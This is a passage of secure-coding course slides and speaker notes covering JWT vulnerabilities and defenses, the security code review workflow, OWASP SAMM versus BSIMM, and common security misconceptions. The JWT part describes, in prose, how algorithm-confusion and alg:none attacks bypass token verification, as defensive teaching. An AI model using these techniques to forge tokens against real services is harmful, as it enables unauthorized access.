Infrastructure configuration hardening is addressed by the Center for Internet Security (CIS) Benchmarks, which provide prescriptive, consensus-developed baseline configurations for hundreds of operating systems, cloud provider services, database servers, and web application platforms. The DISA Security Technical Implementation Guides (STIGs) provide equivalent guidance for federal systems. These benchmarks include specific, auditable requirements: "Ensure the Apache web server is not running as root," "Ensure directory listings are disabled," "Ensure the server signature directive is set to Off." Automated compliance checking tools including CIS-CAT, OpenSCAP, and cloud provider native tools (AWS Security Hub, Azure Security Center, GCP Security Command Center) can evaluate infrastructure configurations against these benchmarks continuously, alerting when configuration drift introduces new misconfigurations. NIST SP 800-123 (Guide to General Server Security) and SP 800-44 (Guidelines on Securing Public Web Servers) provide foundational federal guidance on web server and general server hardening, while ISO/IEC 27001:2022 Annex A control 8.8 (Management of Technical Vulnerabilities) requires that organizations obtain timely information about technical vulnerabilities and take appropriate measures, encompassing misconfiguration management alongside CVE patching as a technical vulnerability category.
:::

%%%
---
unit: Testing
code: JWT
title: "JWT Security: Common Vulnerabilities and Defenses"
---
:::callout style=soft
**JSON Web Tokens (JWT)** are widely used for stateless authentication and API authorization. Despite being a standardized format (RFC 7519), JWTs have several well-documented implementation vulnerabilities that have caused significant real-world breaches.
:::

:::table
| JWT Vulnerability | CVE/CWE | Attack | Defense |
|---|---|---|---|
| Algorithm confusion (`alg: none`) | CVE-2015-9235 | Attacker forges token with `alg: none`, removes signature | Enforce expected algorithm server-side; never trust `alg` from token |
| RS256 → HS256 algorithm confusion | CVE-2016-5431 | Attacker signs token with HS256 using the server's public key | Pin expected algorithm in server code; verify with correct key type |
| Weak HS256 secret | CWE-326 | Offline brute-force attack on short or guessable secrets | Minimum 256-bit cryptographically random secret |
| Missing expiration (`exp` claim) | CWE-613 | Stolen token valid indefinitely | Always set `exp`; reject tokens past expiry; implement token revocation |
| Sensitive data in payload | CWE-312 | JWT payload is Base64-encoded, not encrypted, anyone can decode it | Never include PII, passwords, or secrets in JWT payload; use JWE for encryption |
:::

:::image src="images/23_jwt_structure_and_vulnerabilities.png" alt="JWT anatomy diagram on white background. A JWT string shown at the top: three Base64url-encoded sections separated by dots, colored red (header), purple (payload), blue (signature). Below, each section is decoded: Header shows alg and typ fields with a red warning on alg field labeled 'Never trust, validate server-side.' Payload shows sub, iat, exp, and role fields with a warning on role labeled 'Privilege field, validate server-side, never derive permissions solely from token claims without additional checks.' Signature section shows HMACSHA256(base64url(header)+'.'+base64url(payload), secret) with a warning on secret labeled 'Must be 256+ bits cryptographically random.' Below the anatomy, three attack scenario boxes: (1) alg:none attack shown with forged token structure. (2) Algorithm confusion (RS256 to HS256) shown with signature verification bypass. (3) Expired token reuse shown with missing exp check." caption="JWT structure: only the signature provides integrity protection. The header and payload are Base64url-encoded, not encrypted, and can be read by anyone who possesses the token. The signature verifies authenticity but only if the server enforces the expected algorithm and key type." width=full
:::

:::notes
JSON Web Tokens have become the dominant mechanism for stateless authentication and API authorization in modern web application architectures, particularly in microservices and single-page application designs where the traditional server-side session store model is impractical. A JWT consists of three Base64url-encoded sections: the header (specifying the token type and signing algorithm), the payload (containing "claims", assertions about the token's subject and validity), and the signature (a cryptographic value computed over the header and payload using a secret key). The critical property of JWTs is that their integrity is protected by the signature: any modification of the header or payload invalidates the signature, and a server that correctly verifies the signature can trust that the token was issued by the expected party and has not been tampered with.

The phrase "correctly verifies" is load-bearing. Several JWT libraries had implementations where the signature verification could be bypassed through algorithm manipulation. The "algorithm confusion" attack in CVE-2015-9235 exploited the fact that some libraries respected the `alg` field in the JWT header, the attacker-controlled part of the token, when selecting the verification algorithm. By setting `alg: none` in the header, an attacker could remove the signature entirely and submit a token with a forged payload. Libraries that did not enforce an expected algorithm on the server side would accept this signature-less token as valid. The OWASP JWT Security Cheat Sheet explicitly recommends that all JWT implementations ignore the `alg` field in the token header entirely and use only the server-side configured algorithm for verification.

The RS256-to-HS256 algorithm confusion attack (CVE-2016-5431) is more subtle. Some services used RS256 (RSA asymmetric signing) to issue tokens and published their RSA public key for clients to use in verifying tokens. An attacker could forge a token signed with HS256 (HMAC symmetric signing) using the service's public key as the HMAC secret. A library that switched between RS256 and HS256 based on the `alg` header claim would verify the HMAC signature using the known-public RSA key and report the signature as valid, accepting the forged token. The defense again requires server-side algorithm pinning: the library must be configured with the expected algorithm and must reject any token that specifies a different algorithm.

The absence of expiration claims is a fundamental design failure. A JWT without an `exp` claim is, by design, valid forever. If a JWT is stolen, through log exposure, XSS, insecure storage in `localStorage`, or network interception, an attacker can use the token indefinitely. Stateless JWTs cannot be individually revoked without introducing server-side state (a token revocation list), which partially negates the statelessness advantage. The practical recommendations are: always set a short `exp` value (15 minutes to 1 hour for access tokens), implement a separate longer-lived refresh token mechanism with server-side revocation capability for the refresh token, and design the application to handle token expiry gracefully by automatically refreshing using the refresh token.

Sensitive data in JWT payloads is a common developer misunderstanding rooted in confusion between encoding and encryption. Base64url is an encoding scheme, not an encryption scheme: any party that possesses the JWT string can decode the payload by running `atob(payload.split('.')[1])` in a browser console, or `base64 -d <<< <payload>` in a shell. This means JWTs must never contain passwords, raw session secrets, payment card data, Social Security numbers, or other sensitive identifiers. Role claims in JWTs (`"role": "admin"`) are common and appropriate for stateless authorization decisions, but the server must re-validate that the claimed role is consistent with the expected state, particularly important when role demotions (removing admin access from a user) need to take effect immediately rather than waiting for the current short-lived token to expire. NIST SP 800-63C (Federation and Assertions) provides the authoritative federal guidance on assertion (including JWT) security requirements for federated identity systems.
:::

%%%
---
unit: SDLC
code: REV
title: "Security Code Review: Process and Focus Areas"
---
:::callout style=soft
**Security code review** is the manual, expert-led examination of source code to identify vulnerabilities that automated tools cannot reliably detect, including business logic flaws, authorization bypass conditions, and cryptographic protocol design errors. It is a required component of a mature SSDLC.
:::

:::steps
1. **Define Scope and Objectives**: Identify the specific modules, components, or features to be reviewed, and the security properties to be verified (authentication, authorization, input validation, cryptographic correctness, data privacy).
2. **Gather Context**: Review the threat model, data flow diagram, API specification, and security requirements for the component. Understand what the code is intended to do before looking for what it does wrong.
3. **Automated Pre-Scan**: Run SAST tools (Semgrep, Bandit, SpotBugs) before the manual review to surface known vulnerability patterns mechanically; use the human review time for business logic and architectural concerns that tools miss.
4. **High-Risk Focus Areas**: Prioritize manual review time on authentication and session management code, authorization and access control enforcement, cryptographic operations, input validation entry points, third-party API integrations, and deserialization logic.
5. **Follow Data Flows**: Trace user-supplied input from its entry point (HTTP request parameter, file upload, API payload) through all code paths to each output context (database write, HTML render, OS command, log entry), verifying that appropriate controls are applied at each transition.
6. **Document Findings**: Record each finding with: the file path and line number, the vulnerability class (CWE ID), the severity (CVSS score or internal severity scale), a proof-of-concept showing exploitability, and a specific recommended remediation.
7. **Verify Remediations**: After developers address findings, review the remediated code to confirm the fix is correct and does not introduce new issues. A fix that applies escaping in the wrong context may provide false confidence without actual security improvement.
:::

:::image src="images/23_security_code_review_workflow.png" alt="Swimlane diagram showing security code review workflow across three lanes: Developer, Security Reviewer, and Issue Tracker. Developer lane: Feature branch created, code written, automated SAST and SCA run in CI (results shown as pre-review filter), pull request opened for review. Security Reviewer lane: receives notification of PR with security-relevant changes (based on code ownership rules for security-sensitive paths), downloads branch, reviews threat model, performs manual code review focusing on high-risk areas, documents findings in issue tracker. Issue Tracker lane: findings are created as security issues with CWE, severity, file path, PoC, and remediation fields. Developer addresses findings, marks as resolved, requests re-review. Security Reviewer validates fixes, approves PR or requests further changes. PR merged only after security sign-off on security-relevant components." caption="Security code review workflow: automated scanning provides the baseline, while the manual review focuses security expert time on business logic, authorization flows, and cryptographic operations that automated tools cannot reliably evaluate." width=full
:::

:::notes
Automated security testing tools, SAST, DAST, IAST, SCA, provide breadth of coverage across large codebases at machine speed, but they have inherent limitations in what they can detect. Business logic vulnerabilities, by definition, require understanding the application's intended behavior to recognize a deviation from it; no automated rule can capture "the application should not allow a user to cancel another user's order, but it does." Authorization bypass conditions often involve the interaction between multiple code components, an authentication check in one module that assumes a property about request context established by a different module. Cryptographic protocol design errors may be syntactically correct (using an approved algorithm, from an approved library, with an apparently correct API call) while being semantically incorrect (using the same nonce for multiple messages in GCM mode, which is catastrophically insecure). Manual security code review by a security engineer who understands both the code and the security properties being verified is irreplaceable for these vulnerability classes.

The most valuable output of a security code review is not a list of specific bugs but an understanding of the system's trust model: what does the code implicitly assume about the inputs it receives, the state of the system, and the behavior of its dependencies? These assumptions are often the source of security vulnerabilities. A function that processes a payment may assume it will only be called after the caller has verified the user is authenticated, but if the call graph has a code path that reaches the function without authentication (perhaps through an internal API endpoint added for testing), the assumption is wrong and a vulnerability exists.

The focus area checklist for security code review follows the highest-density vulnerability categories. Authentication code, password comparison logic, MFA validation, password reset flows, requires careful review because timing side channels (comparing password hashes character-by-character rather than with a constant-time comparison function) can enable password recovery attacks even against correctly hashed passwords. Authorization enforcement code requires review of every conditional branch: does the code verify resource ownership (not just authentication), does it enforce the correct privilege level for each action, is access control enforced in the correct architectural layer (server side, not client side)? Input validation must be traced from every external input source through all code paths to all output sinks, verifying that the validation applied is appropriate for each specific output context.

Data flow analysis is the most time-intensive but highest-value manual technique. A reviewer traces user input from its entry point, `request.form.get('comment')` in Flask, `request.getParameter('name')` in Java Servlets, `req.body.email` in Express.js, through all code paths to every location where it is used. Each usage must be evaluated against the security requirements of the output context: parameterized if it flows to a database query, HTML-encoded if it flows to an HTML template, JavaScript-escaped if it flows to a script block, URL-encoded if it flows to a redirect URL, logged if it flows to a log (with verification that it does not contain sensitive data). A finding is raised when a flow reaches an output context without the appropriate control applied.

ISO/IEC 27001:2022 Annex A control 8.28 (Secure Coding) requires that organizations define and apply secure coding principles, and that code be reviewed by a second party for security, particularly for security-sensitive code. PCI-DSS 4.0 Requirement 6.2.4 requires that bespoke and custom software be protected from common software attacks through security code review or automated application security testing. NIST SP 800-218 (SSDF) practice CR.1.1 recommends that organizations establish and follow coding standards that address security, and that code be reviewed by others, particularly for security-relevant functionality. The OWASP Code Review Guide (version 2.0) provides a comprehensive methodology and reference for manual security code review practice, organized by vulnerability category with specific patterns and indicators for each.
:::

%%%
---
unit: Testing
code: CMP
title: "Comparison: Secure Coding Frameworks, OWASP SAMM vs. BSIMM"
---
:::callout style=soft
Two complementary frameworks help organizations measure and improve the maturity of their secure software development practices: **OWASP SAMM** (a prescriptive model) and **BSIMM** (an empirical benchmark). Understanding the difference guides which to use for which purpose.
:::

:::table
| Attribute | OWASP SAMM v2 | BSIMM (v14, 2023) |
|---|---|---|
| **Type** | Prescriptive maturity model | Empirical benchmark / descriptive study |
| **Origin** | OWASP community project | Cigital (now Synopsys) research |
| **Data Source** | Best practice consensus | Observations from 130+ real organizations |
| **Structure** | 5 Business Functions → 15 Security Practices → 3 Maturity Levels | 4 Domains → 12 Practices → 121 Activities |
| **Primary Use** | Define target state; plan improvement roadmap | Compare your program to industry peers; identify gaps |
| **Output** | Maturity scorecard per practice (Level 0–3) | Activity adoption rate vs. industry average |
| **Governance** | Open-source, community-maintained | Annual updated report, subscription for detailed data |
| **Best For** | Organizations building or formalizing an AppSec program | Organizations benchmarking a mature program against peers |
:::

:::image src="images/23_samm_vs_bsimm_comparison.png" alt="Side-by-side framework structure diagram on white background. Left panel: OWASP SAMM v2 structure. Central hub labeled 'Software Assurance.' Five surrounding columns labeled: Governance (Strategy & Metrics, Policy & Compliance, Education & Guidance), Design (Threat Assessment, Security Requirements, Security Architecture), Implementation (Secure Build, Secure Deployment, Defect Management), Verification (Architecture Assessment, Requirements-driven Testing, Security Testing), Operations (Incident Management, Environment Management, Operational Management). Each practice has three maturity level icons (filled circles: 0 empty, 1 partially filled, 2 mostly filled, 3 fully filled). Right panel: BSIMM structure. Four domains: Governance (Strategy & Metrics, Compliance & Policy, Training), Intelligence (Attack Models, Security Features & Design, Standards & Requirements), SSDL Touchpoints (Architecture Analysis, Code Review, Security Testing), Deployment (Penetration Testing, Software Environment, Configuration Management & Vulnerability Management). Activities shown as bullet points under each practice with adoption percentages from 130+ firms." caption="OWASP SAMM is a prescriptive roadmap for building an application security program; BSIMM is an empirical benchmark of what actual organizations do. Used together: SAMM defines where you want to go; BSIMM shows you how far along that path most of your industry peers are." width=full
:::

:::notes
When an organization decides to improve its secure software development capability, two questions arise: "What should we be doing?" and "How do we compare to our industry peers?" OWASP SAMM and BSIMM answer these questions from complementary perspectives, and understanding the distinction between them helps practitioners use each framework for the purpose it was designed to serve.

OWASP SAMM (Software Assurance Maturity Model) is a prescriptive model developed by the OWASP community and maintained as an open-source project. It defines five Business Functions that collectively encompass all aspects of secure software development: Governance (the organizational context and strategic direction of the security program), Design (the security activities in the specification and design phases), Implementation (the security activities during coding and build), Verification (security testing and assurance activities), and Operations (the security activities after deployment throughout the operational lifecycle). Each Business Function contains three Security Practices, and each Security Practice is evaluated on a three-level maturity scale. Level 1 represents initial adoption of a basic practice; Level 2 represents a structured, consistently applied practice; Level 3 represents a highly optimized practice with quantitative feedback and continuous improvement. SAMM version 2.0 also introduced an associated assessment questionnaire and scoring spreadsheet, allowing organizations to self-assess their current maturity level per practice and track progress over time as their program evolves.

BSIMM (Building Security In Maturity Model) takes a fundamentally different approach. Rather than defining what organizations should do based on expert consensus, BSIMM is an empirical study of what organizations actually do. Conducted annually by Synopsys (which acquired the original Cigital research organization), BSIMM involves conducting structured interviews with security leaders at participating organizations and systematically documenting which of the 121 defined security activities each organization has implemented. The resulting dataset, which in version 14 represents over 130 organizations spanning technology, financial services, healthcare, and other sectors, allows BSIMM to report the adoption rate of each activity across the entire study population and across specific industry verticals.

The practical implication of this difference is that SAMM is the right tool for organizations building or formalizing their AppSec program, because it defines a complete target state and a structured path to it. BSIMM is the right tool for organizations with established programs that want to benchmark themselves against industry peers, because it answers: "Of the 130+ organizations in the BSIMM study, what percentage have implemented code review for security, and for organizations in our industry specifically, what is the adoption rate of each security activity?" An organization that discovers it has adopted more security activities than 80% of its industry peers has strong evidence that its program is mature relative to the market; an organization that discovers it has fewer adopted activities than 50% of peers has a clear signal about areas requiring investment.

Microsoft's Security Development Lifecycle (SDL), while not a general industry framework, was historically the first formalized SSDLC methodology and contributed the foundational concepts, threat modeling, security code review, penetration testing, and security training, that both SAMM and BSIMM subsequently systematized and measured. NIST SP 800-218 (SSDF) provides a U.S. government-endorsed SSDLC framework that maps closely to SAMM's business function structure and is now a contractual requirement for federal software vendors under Executive Order 14028. ISO/IEC 27034 (Application Security) provides the international standards equivalent, with five parts covering concepts and framework, organization normative framework, application security management process, application security validation, and protocols and application security controls data structure. Organizations subject to international standards compliance may find ISO/IEC 27034 a more directly auditable reference than SAMM, while SAMM remains the more widely adopted operational framework for practical AppSec program management.
:::

%%%
---
unit: Summary
code: MIS
title: "Common Misconceptions in Secure Coding"
---
:::callout style=soft
Several widely held developer beliefs about security are incorrect and lead to false confidence. Recognizing and correcting these misconceptions is as important as learning the correct controls.
:::

:::list style=tight
- **Misconception 1: "We use a WAF, so we don't need to fix the code."** Web Application Firewalls are bypass-able filters, not fixes. A WAF provides defense-in-depth but cannot reliably detect all injection variants or business logic flaws. Source code fixes are the only durable remediation.
- **Misconception 2: "HTTPS means the application is secure."** HTTPS encrypts data in transit between browser and server. It does not protect stored data, prevent injection attacks, enforce access control, or protect against vulnerabilities in the application itself.
- **Misconception 3: "We hash the passwords, so a breach isn't a big deal."** Unsalted MD5/SHA-1 hashes are cracked within hours for common passwords. Only adaptive hashing algorithms (Argon2id, bcrypt) with proper work factors provide genuine resistance to offline cracking.
- **Misconception 4: "Security testing is the security team's job, not developers'."** Security vulnerabilities are created by developers. Developers who understand secure coding produce fewer vulnerabilities, making testing's job easier. Developer security education is consistently the highest-ROI security investment.
- **Misconception 5: "If it passed the pentest, it's secure."** A penetration test is a point-in-time assessment of the specific scope tested by the specific tester on the specific engagement date. New code, new dependencies, new configurations, and untested components all create new attack surface after the pentest concludes.
- **Misconception 6: "Obscurity is security, if we don't document the API, attackers won't find it."** Security through obscurity fails against any attacker who performs reconnaissance. Unauthenticated API endpoints, default credentials, and unpatched systems are found by automated scanners regardless of documentation status.
:::

:::image src="images/23_common_misconceptions_secure_coding.png" alt="Six myth-busting cards on a white background in a 2x3 grid. Each card has a red 'MYTH' badge and a green 'REALITY' badge. Card 1: MYTH: WAF = secure code. REALITY: WAFs are bypassable; source fixes are required. Card 2: MYTH: HTTPS = secure app. REALITY: HTTPS protects transit only; application logic is still vulnerable. Card 3: MYTH: Hashed passwords = safe breach. REALITY: MD5/SHA-1 hashes cracked in hours; use Argon2id. Card 4: MYTH: Security is the security team's job. REALITY: Developers create vulnerabilities; developer education is highest-ROI investment. Card 5: MYTH: Passed pentest = secure. REALITY: Pentest is point-in-time; new code creates new risk immediately. Card 6: MYTH: Undocumented API = hidden API. REALITY: Scanners find APIs regardless of documentation." caption="Six dangerous misconceptions that create false confidence in security posture. Each represents a real-world rationalization used by development teams and managers to defer security work, recognizing them is the first step to countering them." width=full
:::

:::notes
Security misconceptions are often more dangerous than outright ignorance, because they create false confidence. A development team that acknowledges they have not addressed security will often accept that a security review is needed. A development team that believes their WAF, HTTPS certificate, or annual penetration test means they are already secure will resist investing in secure coding improvements, because they believe the problem is already solved. Understanding and being able to refute these misconceptions is a practical professional skill for security engineers working with development organizations.

The WAF misconception is pervasive in organizations that have invested in web application firewall infrastructure. A WAF operates as a reverse proxy that intercepts HTTP requests and analyzes them against a rule set of known attack signatures before forwarding them to the application. This provides genuine value: a well-configured WAF using the OWASP ModSecurity Core Rule Set (CRS) will detect and block many common injection payloads and vulnerability scanners. However, WAF protection fails in several documented ways. Request encoding (URL encoding, double encoding, Unicode normalization, case variation) can evade signature-based rules. Novel attack variants that have not yet been added to the WAF rule set will pass through undetected. Business logic attacks, IDOR, broken access control, logic bypass conditions, have no network-observable signature and cannot be detected by a WAF. A WAF that blocks a known SQL injection payload does not fix the SQL injection vulnerability in the underlying code; an attacker with patience and creativity will find a variant that passes the WAF. The correct framing is: WAF is a defense-in-depth layer that supplements secure code, not a substitute for it.

The HTTPS misconception reflects a consumer-level understanding of the lock icon in the browser address bar. HTTPS (TLS) encrypts the communication channel between the browser and the web server, protecting against network eavesdropping and man-in-the-middle interception. It does not protect the data once it arrives at the server, an attacker who exploits a SQL injection vulnerability on the server sees the same data whether the connection was HTTPS or HTTP. It does not protect stored data. It does not enforce access control or authentication. It does not prevent XSS or CSRF, which are attacks that occur within the trusted (HTTPS) session. HTTPS is a necessary but completely insufficient security control for web applications.

The penetration testing misconception conflates a point-in-time security assessment with a continuous security assurance process. A penetration test provides a snapshot of the security posture of the tested scope on the test date, as observed by the specific tester within the time and scope constraints of the engagement. The tested application is never static: developers push new code, dependencies are updated, configurations change, and new components are added continuously. A critical vulnerability introduced in a commit two days after the penetration test concluded is just as exploitable as one that existed before the test, but the organization's false confidence that "we passed the pentest" may delay investigation of subsequent security signals. Penetration testing is a valuable component of a security testing program, but it must be understood as a complement to, not a replacement for, continuous automated security testing, code review, and vulnerability management. NIST SP 800-115 (Technical Guide to Information Security Testing and Assessment) clarifies the distinct roles of security assessment techniques including vulnerability scanning, penetration testing, and continuous monitoring, emphasizing that no single technique provides comprehensive assurance without the others.
:::

%%%
---
unit: Summary
code: SUM
title: Secure Coding Practices Summary
---
:::pullquote
Input validation and sanitization stop the attack at the door. The secure development lifecycle makes sure that door was designed correctly in the first place.
:::

:::list style=chips
- Allow-list Input Validation (CWE-20)
- Context-Aware Output Encoding (CWE-116)
- Secure SDLC Frameworks (SAMM, MS SDL)
- AST Methodologies (SAST vs. DAST)
- Parameterized Queries (Prepared Statements)
:::

:::image src="images/23_secure_coding_practices_summary.png" alt="Hexagonal tile summary diagram on a white background. A central hexagon labeled 'Secure Code' is surrounded by six satellite hexagons connected by solid lines, each representing a lecture pillar with a distinct accent color: 'Allow-list Validation' (green, funnel icon, CWE-20 label), 'Output Encoding' (teal, HTML entity symbol, CWE-116 label), 'Secure SDLC' (blue, circular lifecycle arrow), 'AST Tools' (purple, scanner icon with SAST/DAST/IAST/SCA sub-labels), 'Prepared Statements' (orange, SQL parameterization symbol with ? placeholder), 'Least Privilege' (red, layered lock icon). Small annotation below each hexagon summarizes the protection: 'Rejects malicious input', 'Prevents XSS at render', 'Builds security in', 'Finds vulnerabilities early', 'Blocks SQL injection', 'Limits blast radius'. Professional textbook style, clean, labeled, white background." caption="A unified view of the six secure coding pillars: each control addresses an independent failure mode, and together they form a comprehensive defense-in-depth strategy at the application layer." width=full
:::

:::notes
In today's lecture, we examined the discipline of secure coding as a systematic set of practices that prevent vulnerabilities from being introduced during development, rather than discovering and remediating them afterward. Each topic we covered addresses a specific failure mode in the application security chain.

Input validation, governed by the principle of allow-listing over block-listing, establishes that the developer must define precisely what constitutes acceptable input and reject everything else. This approach is robust against novel attacks and encoding bypasses because it does not attempt to enumerate bad inputs, it simply enforces a strict definition of good ones. Server-side implementation is non-negotiable; client-side validation is a user experience enhancement, not a security control.

The distinction between input sanitization and output encoding clarified two controls that address different stages of the data lifecycle. Sanitization modifies data at ingestion when the application must accept potentially dangerous content, transforming it into a safe form before storage. Output encoding transforms data at render time, converting characters that are significant in the rendering context (HTML, JavaScript, CSS, URL) into their safe, literal equivalents. Applying both controls in combination creates a defense-in-depth posture against XSS that requires two independent failures to produce a successful exploit.

The Secure Software Development Lifecycle demonstrated that security is most effective when it is integrated as a continuous activity throughout the development process rather than applied as a pre-release gate. By introducing threat modeling in the Design phase, secure coding standards in the Implementation phase, automated AST tools in the Testing phase, and configuration management in the Deployment phase, organizations achieve both better security outcomes and lower remediation costs. The economic argument for shifting security left is compelling: fixing a design flaw before the first line of code is written costs nothing; fixing it in production may cost millions.

The Application Security Testing taxonomy provided a comprehensive view of how different tools complement each other across the testing spectrum. SAST provides deep code coverage and pinpoints specific vulnerable lines. DAST provides runtime and configuration coverage from an external attacker's perspective. IAST combines both by instrumenting the running application from within. SCA addresses the supply chain attack surface by auditing third-party dependencies against known CVE databases. Together, these tools form a comprehensive quality gate that security-mature organizations integrate into their CI/CD pipelines.

Prepared statements provided the definitive architectural solution for SQL injection, not a filter or an escape function, but a structural separation between the query's command structure and its data parameters. The database compiles the query before data arrives, making it impossible for data to influence the command structure. Finally, least privilege at the database, operating system, and API layers established the defense-in-depth principle that limits the impact of any successful exploit to the minimum necessary blast radius.

The case studies, Heartland Payment Systems (SQL injection, 130 million card records, $130M in fines), Log4Shell (supply chain, 10.0 CVSS, thousands of affected organizations worldwide), the 2020 Twitter breach (over-privileged administrative access), and the 2012 LinkedIn breach (unsalted SHA-1 password hashing), ground the abstract technical controls in concrete organizational consequences, illustrating that the costs of insecure coding practices are real, quantifiable, and frequently catastrophic in proportion to the simplicity of the overlooked control.

In our next lecture, we will step out from the application layer to address the security of the underlying asset that every network, application, and system is designed to defend: the data itself. We will explore data classification frameworks, the three states of data, backup architectures, data loss prevention systems, and media sanitization standards, the controls that protect information throughout its entire lifecycle, from creation to secure destruction.

Collectively, the secure coding practices examined in this lecture align with the requirements of several authoritative frameworks. NIST SP 800-53 Revision 5 encodes secure coding requirements across multiple control families: SI-10 (Information Input Validation), SI-15 (Information Output Filtering), SA-11 (Developer Testing and Evaluation), AC-6 (Least Privilege), and SA-8 (Security Engineering Principles). ISO/IEC 27001:2022 addresses software security through Annex A controls 8.25 (Secure Development Life Cycle), 8.26 (Application Security Requirements), 8.27 (Secure System Architecture and Engineering Principles), 8.28 (Secure Coding), and 8.29 (Security Testing in Development and Acceptance). The OWASP Top 10 for 2021 identifies injection flaws (A03:2021), insecure design (A04:2021), and security misconfiguration (A05:2021) as the most prevalent recurring vulnerability categories, each directly addressed by the controls presented in this lecture. Mastery of these practices is not merely a technical competency; it is increasingly a regulatory and contractual requirement for any organization developing software for regulated industries or federal government clients, and a prerequisite for achieving compliance attestations under frameworks such as FedRAMP, SOC 2 Type II, and PCI-DSS 4.0.
:::
